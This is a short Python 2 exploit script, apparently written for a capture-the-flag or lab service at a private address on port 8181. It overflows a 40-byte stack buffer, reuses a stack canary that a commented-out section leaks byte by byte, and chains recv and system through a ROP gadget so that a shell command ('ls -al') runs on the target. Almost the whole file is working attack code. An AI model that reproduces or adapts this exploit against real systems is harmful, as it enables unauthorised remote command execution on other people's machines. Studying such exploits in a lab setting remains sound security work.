from socket import *
from struct import *
from time import *

p = lambda x: pack("<L", x)
up = lambda x : unpack("<L", x)[0]

def sendline(s, string) :
    s.send(string + '\n')

s = socket(AF_INET, SOCK_STREAM)
s.connect(('192.168.228.138', 8181))

print "[+]step01 get canary"
print s.recv(2048)

sendline(s, '1')
print s.recv(1024)

'''
#canary
payload = ''
payload += 'A' * 41 #buffer[40] + canary[1] <= 0x00
s.send(payload)

print s.recv(1024)
print s.recv(41)
canary = "\x00"
canary += s.recv(3)
canary = up(canary)

print "Canary : " + str(hex(canary))
'''

canary = 0x12e5ca00
send_plt = 0x8048700
send_got = 0x804B064
recv_plt = 0x80486E0
recv_got = 0x804B05C
bss = 0x804b1b4
ppppr = 0x8048eec
system_plt = 0x8048620

cmd = 'ls -al'

payload = ''
payload += 'A' * 40
payload += p(canary)
payload += 'B' * 12

payload += p(recv_plt)
payload += p(ppppr)
payload += p(0x04)
payload += p(bss)
payload += p(len(cmd))
payload += p(0x00)
payload += p(system_plt)
payload += p(0x41414141)
payload += p(bss)

s.send(payload)

print s.recv(1024)
sendline(s, '3')

sendline(s, cmd)
print s.recv(1024)
s.close()